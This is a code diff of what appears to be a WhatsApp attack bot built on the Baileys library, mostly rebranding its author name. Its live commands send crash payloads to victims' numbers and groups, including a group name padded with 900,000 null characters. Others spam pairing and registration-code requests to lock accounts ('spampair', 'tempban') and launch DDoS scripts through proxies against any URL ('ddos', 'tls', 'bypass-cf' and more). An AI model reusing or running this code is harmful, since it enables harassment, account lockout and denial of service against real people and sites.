-						"footer": "⿻ ⌜ 𝐉𝐀𝐂𝐊𝐕𝟐 ⌟ ⿻",
+						"footer": "⿻ ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟ ⿻",
 						sections
 					}, {
 						quoted: Zets
@@ -9099,12 +11769,11 @@ break
 			break
 			case "zap": {
 				if (!isPremium) return zreply(mess.premium)
-				if (!isPremium) return zreply(mess.premium)
 				if (input.length == 0) return zreply("_Reply/Tag/Nomer_")
 				const failed = []
 				const count = text.split("|")[1]
 				if (!count)
-					return zreply(`*Syntax Error!*\n\n_Use : Zap No|Amount Spam_\n_Example : Zap 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+					return zreply(`*Syntax Error!*\n\n_Use : Zap No|Amount Spam_\n_Example : Zap 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				if (isNaN(count)) return zreply("Hanya Bisa Angka!!")
 				if (Number(count) < 1) return zreply("Minimal 1")
 				await zreply(mess.bugrespon)
@@ -9140,12 +11809,11 @@ break
 			break
 			case 'loxas': {
 				if (!isPremium) return zreply(mess.premium)
-				if (!isPremium) return zreply(mess.premium)
 				if (input.length == 0) return zreply("_Reply/Tag/Nomer_")
 				const failed = []
 				const count = text.split("|")[1]
 				if (!count)
-					return zreply(`*Syntax Error!*\n\n_Use : Loxas No|Amount Spam_\n_Example : Loxas 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+					return zreply(`*Syntax Error!*\n\n_Use : Loxas No|Amount Spam_\n_Example : Loxas 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				if (isNaN(count)) return zreply("Hanya Bisa Angka!!")
 				if (Number(count) < 1) return zreply("Minimal 1")
 				await zreply(mess.bugrespon)
@@ -9289,12 +11957,11 @@ break
 			break
 			case "bugcomunity": {
 				if (!isPremium) return zreply(mess.premium)
-				if (!isPremium) return zreply(mess.premium)
 				if (input.length == 0) return zreply("_Reply/Tag/Nomer_")
 				const failed = []
 				const count = text.split("|")[1]
 				if (!count)
-					return zreply(`*Syntax Error!*\n\n_Use : bugcomunity No|Amount Spam_\n_Example : bugcomunity 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+					return zreply(`*Syntax Error!*\n\n_Use : bugcomunity No|Amount Spam_\n_Example : bugcomunity 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				if (isNaN(count)) return zreply("Hanya Bisa Angka!!")
 				if (Number(count) < 1) return zreply("Minimal 1")
 				await zreply(mess.bugrespon)
@@ -9310,7 +11977,7 @@ break
 									groupJid: "1234567890@g.us",
 									inviteCode: "abcdefg",
 									inviteExpiration: Date.now() + 86400000,
-									groupName: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️" + "\u0000".repeat(900000),
+									groupName: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" + "\u0000".repeat(900000),
 									thumbnail: fs.readFileSync(`./virtex/venom.enc`),
 									caption: "VenomZin Bug",
 									groupType: 1,
@@ -9346,8 +12013,7 @@ break
 			break
 			case "convite": {
 				if (!isPremium) return zreply(mess.premium)
-				if (!isPremium) return zreply(mess.premium)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Convite Number_\n_Example : Convite 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Convite Number_\n_Example : Convite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
 					zreply(mess.bugrespon)
 					for (let jamok = 10; jamok !== 0; jamok -= 1) {
@@ -9435,8 +12101,7 @@ break
 			break
 			case "rosapay": {
 				if (!isPremium) return zreply(mess.premium)
-				if (!isPremium) return zreply(mess.premium)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Rosapay Number_\n_Example : Rosapay 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Rosapay Number_\n_Example : Rosapay 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				const sections = []
 				const listgroup = await VxoZap.getAllGroups(true)
 				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
@@ -9651,8 +12316,7 @@ break
 			//=================================================//
 			case "convite-nova": {
 				if (!isPremium) return zreply(mess.premium)
-				if (!isPremium) return zreply(mess.premium)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Convite-nova Number_\n_Example : Convite-nova 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Convite-nova Number_\n_Example : Convite-nova 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				const sections = []
 				const listgroup = await VxoZap.getAllGroups(true)
 				if (!isNaN(parseInt(text)) && text.endsWith("@g.us")) {
@@ -9720,12 +12384,11 @@ break
 			//=================================================//
 			case "crashgp": {
 				if (!isPremium) return zreply(mess.premium)
-			
 				if (input.length == 0) return zreply("_Reply/Tag/Nomer_")
 				const failed = []
 				const count = text.split("|")[1]
 				if (!count)
-					return zreply(`*Syntax Error!*\n\n_Use : Crashgp No|Amount Spam_\n_Example : Crashgp 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+					return zreply(`*Syntax Error!*\n\n_Use : Crashgp No|Amount Spam_\n_Example : Crashgp 62xx|1_\n\n\n_~Amount Spam~_\n1 = 100×\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				if (isNaN(count)) return zreply("Hanya Bisa Angka!!")
 				if (Number(count) < 1) return zreply("Minimal 1")
 				await zreply(mess.bugrespon)
@@ -9795,7 +12458,6 @@ break
 			break
 			case "zerobug": {
 				if (!isPremium) return zreply(mess.premium)
-				
 				if (input.length == 0) return zreply("Reply/Tag/nomer")
 				const failed = []
 				await zreply(mess.bugrespon)
@@ -9855,7 +12517,6 @@ break
 			break
 			case "locimg": {
 				if (!isPremium) return zreply(mess.premium)
-				
 				if (input.length == 0) return zreply("Reply/Tag/nomer")
 				const failed = []
 				await zreply(mess.bugrespon)
@@ -9908,9 +12569,8 @@ break
 			// TEMP BAN \\
 			//=================================================//
 			case 'spampair': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let [peenis, pepekk = "200"] = q.split("|")
 				await zreply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
 				await reaction(m.chat, "✅")
@@ -9922,7 +12582,7 @@ break
 				} = require('@whiskeysockets/baileys')
 				let {
 					state
-				} = await useMultiFileAuthState('AkmalMods')
+				} = await useMultiFileAuthState('TheGetsuzoZhiro')
 				let {
 					version
 				} = await fetchLatestBaileysVersion()
@@ -9942,11 +12602,10 @@ break
 			}
 			break
 			case 'tempban': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (args.length < 1) return zreply(`*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (args.length < 1) return zreply(`*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				const args2 = args[0].split('|');
-				if (args2.length !== 2) return zreply(`Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (args2.length !== 2) return zreply(`Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				const VxoZapCountryCode = args2[0];
 				const xtarget = args2[1];
 				const VxoZapNumber = xtarget.replace('@s.whatsapp.net', '');
@@ -9957,7 +12616,7 @@ break
 					const {
 						stateVxoZap,
 						saveCredsVxoZap
-					} = await useMultiFileAuthState('./AkmalMods');
+					} = await useMultiFileAuthState('./TheGetsuzoZhiro');
 					const VxoZapRequest = await VxoZap.requestRegistrationCode({
 						phoneNumber: '+' + VxoZapCountryCode + `${VxoZapNumber}`,
 						phoneNumberCountryCode: VxoZapCountryCode,
@@ -9983,7 +12642,6 @@ break
 			//=================================================//
 			case 'dos': {
 				if (!isPremium) return zreply(mess.premium)
-				
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1] * 1000
 				if (args.length === 2 && url && !isNaN(time)) {
@@ -10024,13 +12682,12 @@ break
 			break
 			case 'ddos': {
 				if (!isPremium) return zreply(mess.premium)
-				
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10041,11 +12698,10 @@ break
 			}
 			break
 			case 'xc': {
-				if (!isPremium) return zreply(mess.premium)
-			
+				if (!isPremium) return zreply(mess.premium);
 				let [url, time, rate, thread, proxyFile] = q.split(" ");
 				if (args.length === 5 && url && time && rate && thread && proxyFile) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/LC.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
 						if (err) return console.log(err.toString());
 						if (stdout) return console.log(util.format(stdout));
@@ -10057,13 +12713,12 @@ break
 			break
 			case 'mix': {
 				if (!isPremium) return zreply(mess.premium)
-				
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10075,13 +12730,12 @@ break
 			break
 			case 'floods': {
 				if (!isPremium) return zreply(mess.premium)
-				
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10092,14 +12746,13 @@ break
 			}
 			break
 			case 'ua': {
-				
 				if (!isPremium) return zreply(mess.premium)
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10110,14 +12763,13 @@ break
 			}
 			break
 			case 'xchrome': {
-				
 				if (!isPremium) return zreply(mess.premium)
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10129,13 +12781,12 @@ break
 			break
 			case 'tls': {
 				if (!isPremium) return zreply(mess.premium)
-				
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10147,13 +12798,12 @@ break
 			break
 			case 'tlsbypass': {
 				if (!isPremium) return zreply(mess.premium)
-				
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10164,14 +12814,13 @@ break
 			}
 			break
 			case 'tlsv2': {
-				
 				if (!isPremium) return zreply(mess.premium)
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10183,13 +12832,12 @@ break
 			break
 			case 'bypass-cf': {
 				if (!isPremium) return zreply(mess.premium)
-				
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10200,14 +12848,13 @@ break
 			}
 			break
 			case 'tls-vip': {
-				
 				if (!isPremium) return zreply(mess.premium)
 				let url = q.split(" ")[0]
 				let time = q.split(" ")[1]
 				let thread = q.split(" ")[2]
 				let rate = q.split(" ")[3]
 				if (args.length === 4 && url && time && thread && rate) {
-					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} ✨ Serangan Berlangsung Selama ${time} Detik.`);
+					zreply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
 					exec(`node ./system/ddos/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
 						if (err) return console.log(err.toString())
 						if (stdout) return console.log(util.format(stdout))
@@ -10222,43 +12869,6 @@ break
 			//END\\
 			//=================================================//
 
-			default:
-				if (budy.startsWith("=>")) {
-					if (!isCreator) return zreply(mess.owner)
-
-					function Return(sul) {
-						sat = JSON.stringify(sul, null, 2)
-						bang = util.format(sat)
-						if (sat == undefined) {
-							bang = util.format(sul)
-						}
-						return zreply(bang)
-					}
-					try {
-						zreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
-					} catch (e) {
-						zreply(String(e))
-					}
-				}
-				//=================================================//
-				if (budy.startsWith(">")) {
-					if (!isCreator) return zreply(mess.owner)
-					try {
-						let evaled = await eval(budy.slice(2))
-						if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
-						await zreply(evaled)
-					} catch (err) {
-						await zreply(String(err))
-					}
-				}
-				//=================================================//
-				if (budy.startsWith("$")) {
-					if (!isCreator) return zreply(mess.owner)
-					exec(budy.slice(2), (err, stdout) => {
-						if (err) return zreply(`${err}`)
-						if (stdout) return zreply(`${stdout}`)
-					})
-				}
 		}
 	} catch (err) {
 		const handleError = async () => {
